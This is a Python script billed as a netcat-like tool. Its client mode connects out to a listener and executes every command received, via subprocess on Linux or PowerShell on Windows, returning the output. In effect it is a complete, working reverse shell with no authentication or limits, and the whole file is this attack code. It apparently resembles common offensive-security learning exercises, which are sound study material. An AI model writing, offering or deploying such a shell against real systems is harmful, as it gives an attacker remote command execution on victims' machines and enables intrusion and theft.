import argparse
import socket
import textwrap
import subprocess
import shlex
import sys
import os

# Argument Parsing
parser = argparse.ArgumentParser(
    description="netcat-like tool built in python. It can be used on both server to start a lister or the client"
                " to initiate a connection to the server.", epilog=textwrap.dedent('''Example: 
netcat.py -t <IP> -p <port> -l
netcat.py -t <IP> -p <port> -l
'''))

parser.add_argument("-t", "--target", required=True, type=str, help="Target <IP> to connect or listen on.")
parser.add_argument("-p", "--port", required=True, type=int, help="Target <port> to connect to or listen on.")
parser.add_argument("-l", "--listen", required=False, action="store_true", help="Start netcat.py in listener(server) mode,"
                                                                                 "default(no argument) client mode.")
args = parser.parse_args()

# Server
def start_listener(IP, port):
    # Start listener on the specified IP:port socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((IP, port))
    print(f"[+] Listening for incoming connections on {IP}:{port}")
    server_socket.listen(5)
    # Receive incoming connections
    client_socket, client_address_port = server_socket.accept()
    print(f"Received connection from {client_address_port[0]}:{client_address_port[1]}")
    # Continuously monitor for input from the user, interrupt on CTRL+C
    try:
        while True:
            command = input("> ").strip()
            if not command:
                continue
            client_socket.send(command.encode())
            response = receive_all_data(client_socket)
            if response:
                print(response.decode())
    except KeyboardInterrupt:
        print("\nUser terminated.")
        client_socket.close()
        server_socket.close()
        sys.exit()

# Client
def connect_to_listener(IP, port):
    # Spawn a new socket to connect to target IP:port
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((IP, port))
    while True:
        response = client.recv(4096)
        if not response:
            break
        command_string = response.decode()
        if command_string.startswith("cd "):
            msg = change_directory(command_string)
            client.send(msg.encode())
        else:
            output = run_command(command_string).strip()
            client.send(output.encode())
    client.close()

def receive_all_data(sock):
    response = b''
    while True:
        data_chunk = sock.recv(4096)
        response += data_chunk
        if len(data_chunk) < 4096:
            break
    return response

def run_command(command_string):
    if sys.platform == "linux":
        command_args = shlex.split(command_string)
        process = subprocess.Popen(command_args,stdout=subprocess.PIPE, stderr=subprocess.PIPE,text=True,cwd=os.getcwd())
        output = process.stdout.read() + process.stderr.read()
        return output
    elif sys.platform == "win32":
        powershell_command = f'powershell.exe -Command "[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; {command_string}"'
        process = subprocess.Popen(powershell_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=os.getcwd())
        output = process.stdout.read() + process.stderr.read()
        return output.decode("utf-8", errors="ignore")
    else:
        return f"[!] Unsupported platform: {sys.platform}\n"

def change_directory(command_string):
    parts = shlex.split(command_string)
    if len(parts) > 1:
        try:
            os.chdir(parts[1])
            msg = f"Changed directory to {os.getcwd()}"
        except Exception as e:
            msg = f"Directory {parts[1]} does not exist"
    else:
        msg = "No directory specified"
    return msg

def main():
    if args.listen:
        start_listener(args.target, args.port)
    else:
        connect_to_listener(args.target, args.port)

if __name__ == "__main__":
    main()
